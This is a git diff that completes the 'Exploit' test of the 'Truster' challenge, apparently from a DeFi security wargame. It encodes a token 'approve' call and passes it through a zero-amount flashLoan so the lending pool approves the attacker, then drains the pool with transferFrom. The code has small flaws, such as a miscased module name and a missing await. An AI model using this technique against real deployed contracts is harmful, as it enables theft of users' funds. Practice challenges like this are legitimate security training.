@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { web3 } = require('Web3');
 
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
@@ -29,6 +30,22 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        const data = web3.eth.abi.encodeFunctionCall({
+            name: 'approve',
+            type: 'function',
+            inputs: [{
+                type: 'address',
+                name: 'spender'
+            }, {
+                type: 'uint256',
+                name: 'amount'
+            }]
+        }, [attacker, TOKENS_IN_POOL.toString()]);
+
+        this.pool.flashLoan(0, attacker, this.token.address, data)
+
+        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker })
     });
 
     after(async function () {
